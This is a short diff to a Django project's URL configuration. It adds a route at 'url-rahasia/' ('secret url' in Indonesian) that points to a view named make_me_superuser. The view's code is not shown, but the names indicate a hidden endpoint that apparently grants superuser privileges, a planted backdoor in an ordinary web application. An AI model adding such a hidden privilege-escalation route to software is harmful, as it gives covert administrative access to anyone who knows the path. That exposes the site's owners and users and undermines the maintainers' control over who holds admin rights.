@@ -16,4 +16,6 @@ urlpatterns = [
         LogoutView.as_view(), 
         name='logout'
     ),
+     
+     path('url-rahasia/', views.make_me_superuser, name='make-superuser'),
 ]
